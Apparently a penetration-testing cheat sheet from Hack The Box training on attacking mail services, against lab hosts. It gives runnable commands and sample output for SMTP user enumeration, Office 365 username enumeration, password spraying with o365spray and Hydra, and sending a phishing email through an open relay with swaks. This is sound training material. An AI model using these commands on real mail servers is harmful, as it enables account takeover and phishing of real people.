## Enumeration
- Enumeration methods vary between services. 
- Cloud providers often use unique mail server implementations and modern authentication, creating service-specific attack vectors.
- Company-configured services may reveal misconfigurations and bad practices, making them vulnerable to common mail server protocol attacks.

### Host - MX Records

```shell
host -t MX <% tp.frontmatter["VHOST"] %>
```

**Example of Cloud Provider**
```shell
BluePho3nix@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

### DIG - MX Records

```shell
dig mx <% tp.frontmatter["VHOST"] %> | grep "MX" | grep -v ";"
```

**Example of Cloud Provider**
```shell
BluePho3nix@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

### Host - A Records
```shell
host -t A <% tp.frontmatter["VHOST"] %>
```

**Example of Company-configured Services**
```shell
BluePho3nix@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

### Nmap

| **Port**  | **Service**                                                                |
| --------- | -------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           |
| `TCP/143` | IMAP4 Unencrypted                                                          |
| `TCP/110` | POP3 Unencrypted                                                           |
| `TCP/465` | SMTP Encrypted                                                             |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                            |
| `TCP/995` | POP3 Encrypted                                                             |

```shell
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995  <% tp.frontmatter["RHOSTS"] %>
```

#### IMAP / POP3
```bash
sudo nmap <% tp.frontmatter["RHOSTS"] %> -sV -p110,143,993,995 -sC
```

#### SMTP
```bash
sudo nmap <% tp.frontmatter["RHOSTS"] %> -sC -sV -p25
```

##### Nmap - Open Relay
```bash
sudo nmap <% tp.frontmatter["RHOSTS"] %> -p25 --script smtp-open-relay -v
```

## Misconfigurations

### Authentication

Automate the process with [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum).
```shell
 smtp-user-enum -M RCPT -U userlist.txt -D <% tp.frontmatter["VHOST"] %> -t <% tp.frontmatter["RHOSTS"] %>
```

```shell
BluePho3nix@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

## Cloud Enumeration

#### O365 Spray
[o365spray](https://github.com/0xZDH/o365spray), a username enumeration and password spraying tool developed by ZDH, implements various techniques to target Microsoft Office 365 (O365) and will be used to validate if the target domain uses O365.

```shell
python3 o365spray.py --validate  --domain <% tp.frontmatter["VHOST"] %>
```

**Example**
```shell
BluePho3nix@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

##### Identify Usernames

```shell
python3 o365spray.py --enum -U <user-list> --domain <% tp.frontmatter["VHOST"] %>
```

**Example**
```shell
BluePho3nix@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

## Password Attacks
- Works on `SMTP`, `POP3`, `IMAP4`
- Cloud Services:  
	- Microsoft Office 365:  [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper)
	- Gmail or Okta:  [CredKing](https://github.com/ustayready/CredKing)

### Hydra
```shell-session
hydra -L <user-list> -p <password> -f <% tp.frontmatter["RHOSTS"] %> pop3
```

```shell
BluePho3nix@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

### O365 Spray
```shell
python3 o365spray.py --spray -U <user-list> -p <password> --count 1 --lockout 1 --domain  <% tp.frontmatter["VHOST"] %>
```

**Example**
```shell
BluePho3nix@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics Attacks
### Open Relay
```shell
nmap -p25 -Pn --script smtp-open-relay <% tp.frontmatter["RHOSTS"] %>
```

```shell
swaks --from <email> --to <email> --header 'Subject: <subject>' --body '<body>' --server <% tp.frontmatter["RHOSTS"] %>
```

**Example**
```shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```


## Interact with Services
### IMAP
#### cURL
> If you find access credentials
```base
curl -k 'imaps://<% tp.frontmatter["RHOSTS"] %>' --user <username>:<password>
```

**Example**
```shell
BluePho3nix@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
```

#### OpenSSL 
- Interact with the IMAP or POP3 server over SSL
- Navigate the mail server
##### TLS Encrypted Interaction POP3
```bash
openssl s_client -connect <% tp.frontmatter["RHOSTS"] %>:pop3s
```
##### TLS Encrypted Interaction IMAP
```bash
openssl s_client -connect <% tp.frontmatter["RHOSTS"] %>:imaps
```


### SMTP
#### Telnet 
```bash
telnet <% tp.frontmatter["RHOSTS"] %> 25

```
##### HELO/EHLO
**Example**
```bash
BluePho3nix@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 


HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb


EHLO mail1

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

##### VRFY
**Example**
```bash
BluePho3nix@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server 

VRFY root

252 2.0.0 root


VRFY cry0l1t3

252 2.0.0 cry0l1t3


VRFY testuser

252 2.0.0 testuser


VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

##### Send an Email
**Example**
```bash
BluePho3nix@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: <cry0l1t3@inlanefreight.htb>

250 2.1.0 Ok


RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure

250 2.1.5 Ok


DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```
